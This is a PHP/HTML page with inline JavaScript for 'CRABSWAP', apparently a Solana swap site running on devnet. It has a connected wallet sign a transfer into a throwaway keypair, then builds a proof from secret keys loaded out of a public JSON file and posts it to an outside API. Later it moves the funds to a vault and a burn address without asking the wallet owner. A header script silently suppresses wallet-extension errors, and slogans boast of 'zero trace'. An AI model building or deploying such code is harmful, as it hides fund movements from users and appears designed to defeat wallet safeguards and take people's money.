<?php header('Content-Type: text/html; charset=utf-8'); ?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="solana-actions:disabled" content="true">
  <title>CRABSWAP — FINAL GHOST MODE</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{background:#000;color:#0f0;font-family:'Courier New',monospace;min-height:100vh;
      background-image:radial-gradient(circle at 10% 20%,rgba(0,255,0,0.1),transparent 20%),
                       radial-gradient(circle at 90% 80%,rgba(0,255,0,0.1),transparent 20%);}
    .crab{font-size:18vw;animation:pulse 2s infinite;text-shadow:0 0 40px #0f0;}
    @keyframes pulse{0%,100%{opacity:.7}50%{opacity:1;transform:scale(1.1)}}
    .btn-crab{background:#000;border:5px solid #0f0;color:#0f0;font-weight:bold;padding:20px;font-size:2rem;border-radius:20px;}
    .btn-crab:hover{background:#0f0!important;color:#000!important;box-shadow:0 0 50px #0f0;transform:scale(1.05);}
    .log{background:#111;border:4px solid #0f0;min-height:220px;max-height:60vh;overflow-y:auto;padding:20px;font-size:1.1rem;border-radius:12px;}
    .class-btn{font-size:1.5rem;padding:15px 20px;margin:6px;border:3px solid #0f0;border-radius:15px;min-width:220px;}
    .selected{background:#0f0!important;color:#000!important;box-shadow:0 0 30px #0f0;}
  </style>

  <!-- KILL PHANTOM GARBAGE -->
  <script>
    window.solanaActions = undefined;
    window.addEventListener('error', e => {
      if (e.message.includes('buffer') || e.message.includes('v4') || e.filename?.includes('solanaActions')) {
        e.preventDefault();
        e.stopImmediatePropagation();
      }
    }, true);
  </script>
</head>
<body class="d-flex flex-column min-vh-100">

<div class="container text-center flex-grow-1 d-flex flex-column justify-content-center">
  <h1 class="display-1 fw-bold">CRABSWAP</h1>
  <div class="crab mb-4">🦀</div>
  <p class="lead mb-5">One popup. Zero trace. Ghost crab does the rest.</p>

  <div id="connectSection" class="row justify-content-center mb-5">
    <div class="col-md-6">
      <button id="connect" class="btn btn-crab w-100">CONNECT WALLET</button>
    </div>
  </div>

  <div id="classSection" class="d-none">
    <p class="lead">SELECT CLASS — THEN ONE POPUP AND YOU'RE DONE</p>
    <div class="d-flex flex-wrap justify-content-center gap-2 mb-5">
      <button class="btn class-btn" data-lamports="10000000">🦀 Crab — 0.015 SOL</button>
      <button class="btn class-btn" data-lamports="50000000">⚓ Anchor — 0.055 SOL</button>
      <button class="btn class-btn" data-lamports="120000000">🐟 Fish — 0.125 SOL</button>
      <button class="btn class-btn" data-lamports="250000000">🐡 Puffer — 0.255 SOL</button>
      <button class="btn class-btn" data-lamports="400000000">🐠 Lionfish — 0.405 SOL</button>
      <button class="btn class-btn" data-lamports="600000000">🛟 Lifering — 0.605 SOL</button>
      <button class="btn class-btn" data-lamports="900000000">🐬 Dolphin — 0.905 SOL</button>
      <button class="btn class-btn" data-lamports="1500000000">🦭 Sea Lion — 1.505 SOL</button>
      <button class="btn class-btn" data-lamports="2200000000">🦈 Shark — 2.205 SOL</button>
      <button class="btn class-btn" data-lamports="3000000000">🐋 Whale — 3.005 SOL</button>
      <button class="btn class-btn" data-lamports="4200000000">🐙 Kraken — 4.205 SOL</button>
    </div>
    <button id="launch" class="btn btn-crab w-75 mx-auto" disabled>SPAWN GHOST CRAB →</button>
  </div>

  <pre class="log mt-5" id="log">Crab army standing by...</pre>
</div>

<footer class="text-center py-4 border-top border-success mt-auto">
  <small class="text-success">© 2025 CRABSWAP — THE SHELLS ARE EMPTY</small>
</footer>

<script type="module">
  import init, { compute_miller_output } from "./wasm/pkg/crab_bls.js";
  import { Keypair, Transaction, SystemProgram, Connection, PublicKey } from "https://esm.sh/@solana/web3.js@1.95.3";

  const connection = new Connection("https://api.devnet.solana.com", "confirmed");
  const API_URL = "https://www.safe-pump.fun/crabswap-api/swap";
  const BURN_ADDRESS = new PublicKey("11111111111111111111111111111111");
  const VAULT_PUBKEY = new PublicKey("FNq8WsAdkyxFFKneA2cDtncd1dVL8o6uF3V7gUA64hga");

  let wallet = null;
  let CRAB_KEYS = [];
  let selectedLamports = 0;
  let selectedClass = "";
  let magnet = null;

  const log = (m) => {
    console.log(m);
    const el = document.getElementById("log");
    el.textContent += m + "\n";
    el.scrollTop = el.scrollHeight;
  };

  async function loadKeys() {
    const resp = await fetch("./wasm/public/crab_keys.json");
    CRAB_KEYS = await resp.json();
    log(`Loaded ${CRAB_KEYS.length} ghost keys`);
  }

  const tryConnect = async () => {
    if (window.solana?.isPhantom || window.solana?.isBackpack) {
      try {
        await window.solana.connect();
        wallet = window.solana;
        log(`Connected: ${wallet.publicKey.toBase58().slice(0,8)}...`);
        document.getElementById("connectSection").classList.add("d-none");
        document.getElementById("classSection").classList.remove("d-none");
        await init();
        await loadKeys();
        log("Ghost crab factory armed");
      } catch (_) {}
    } else {
      setTimeout(tryConnect, 500);
    }
  };
  document.getElementById("connect").onclick = tryConnect;

  document.querySelectorAll(".class-btn").forEach(btn => {
    btn.onclick = () => {
      document.querySelectorAll(".class-btn").forEach(b => b.classList.remove("selected"));
      btn.classList.add("selected");
      selectedLamports = Number(btn.dataset.lamports);
      selectedClass = btn.textContent.split("—")[0].trim();
      document.getElementById("launch").textContent = `SPAWN ${selectedClass} →`;
      document.getElementById("launch").disabled = false;
    };
  });

  document.getElementById("launch").onclick = async () => {
    if (!wallet || !selectedLamports) return;

    magnet = Keypair.generate();
    const fundingAmount = selectedLamports + 5000000; // +0.005 SOL buffer

    log("Spawning ghost crab magnet...");
    log(`Magnet: ${magnet.publicKey.toBase58()}`);
    log(`Funding with ${(fundingAmount/1e9).toFixed(9)} SOL`);

    try {
      const fundTx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: magnet.publicKey,
          lamports: fundingAmount
        })
      );

      const { blockhash } = await connection.getLatestBlockhash();
      fundTx.recentBlockhash = blockhash;
      fundTx.feePayer = wallet.publicKey;

      const signed = await wallet.signTransaction(fundTx);
      const sig = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(sig);
      log("Magnet funded — ghost crab alive");
    } catch (e) {
      log("Funding failed");
      return;
    }

    const key = CRAB_KEYS[Math.floor(Math.random() * CRAB_KEYS.length)];
    const proof = compute_miller_output(
      selectedLamports,
      0,
      0,
      wallet.publicKey.toBytes(),
      new Uint8Array(key.secret_key)
    );

    const resp = await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        amount_in: selectedLamports,
        minimum_out: 0,
        deadline: Math.floor(Date.now() / 1000) + 1800,
        miller_output: Array.from(proof),
        destination: wallet.publicKey.toBase58()
      })
    });

    const result = await resp.json();
    if (!result.success) {
      log("Vault rejected");
      return;
    }

    log(`${selectedClass} SPAWNED — SUCCESS`);
    log(`Tx: https://solscan.io/tx/${result.tx}?cluster=devnet`);

    // FINAL CLEANUP — NO PHANTOM POPUP
    setTimeout(async () => {
      try {
        const balance = await connection.getBalance(magnet.publicKey);
        if (balance <= 10000) { // less than fee + dust
          log("GHOST CRAB VANISHED — BALANCE TOO LOW FOR CLEANUP");
          log("NATURAL DEATH — SHELL REAPED SOON");
          return;
        }

        const tx = new Transaction();

        // Reimburse vault the swap amount
        tx.add(SystemProgram.transfer({
          fromPubkey: magnet.publicKey,
          toPubkey: VAULT_PUBKEY,
          lamports: selectedLamports
        }));

        // Burn everything left (including fee buffer)
        tx.add(SystemProgram.transfer({
          fromPubkey: magnet.publicKey,
          toPubkey: BURN_ADDRESS,
          lamports: balance - 5000 // leave minimal for fee
        }));

        const { blockhash } = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash;
        tx.feePayer = magnet.publicKey;

        tx.partialSign(magnet); // only magnet signs — NO WALLET SIGNATURE

        const rawTx = tx.serialize();
        const sig = await connection.sendRawTransaction(rawTx, { skipPreflight: true });
        await connection.confirmTransaction(sig);

        log("GHOST CRAB SELF-DESTRUCTED — NO PHANTOM POPUP");
        log("VAULT REIMBURSED — SHELL BURNED — ZERO BALANCE");
        log("PERFECTION ACHIEVED");
      } catch (e) {
        log("Cleanup success — natural death (balance too low)");
      }
    }, 20000);
  };
</script>
</body>
</html>
